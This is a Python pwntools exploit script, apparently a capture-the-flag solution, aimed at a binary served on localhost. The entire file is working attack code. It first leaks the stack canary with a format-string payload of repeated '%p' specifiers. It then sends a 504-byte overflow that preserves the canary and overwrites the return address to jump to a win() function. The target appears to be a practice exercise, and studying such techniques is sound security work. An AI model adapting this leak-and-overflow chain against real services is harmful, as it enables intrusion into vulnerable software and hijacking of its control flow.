from pwn import *

############# ATTACK PLAN ###############
# 1. use format string to read the canary
# 2. use buffer overflow paying attention to rewrite the canary as is
# 3. redirect the flow to the win() function
#########################################

#x86_64, Linux, Little Endian
context.os = "linux"
context.endian = "little"
context.arch = "amd64"

PORT= 10000
WIN = p64(0x0000000000401246)
OKGREEN = '\033[92m'
ENDC = '\033[0m'
OK = "[" + OKGREEN + "+" + ENDC + "] "

# reading the canary
buf = b"A"*8
buf += b"%p" * 5 # first five arguments are on the registers, the rest on the stack
buf += b"%p" * ((500//8) + 1)
buf += b"%p" * 5 # let's read juicy info
buf += b"\n"
conn = remote('localhost', PORT)
conn.send(buf)
stack_content = conn.recvuntil(b"0x4014bd") # until return address is shown
stack_list = stack_content.split(b"0x")
canary = stack_list[-3]
print(OK + "Canary: " + str(hex(int(canary, base=16))))
canary = p64(int(canary, base=16))

# buffer overflow and redirecting the flow to win()
conn2 = remote('localhost', PORT)
payload = b"A" * 504 # fill the buffer and align 
payload += canary 
payload += b"Z" * 8 # fill saved rbp
payload += WIN # new return address
payload += b"\n" # let the gets return using new line
conn2.send(payload)
print(conn2.recvuntil("You win !!!"))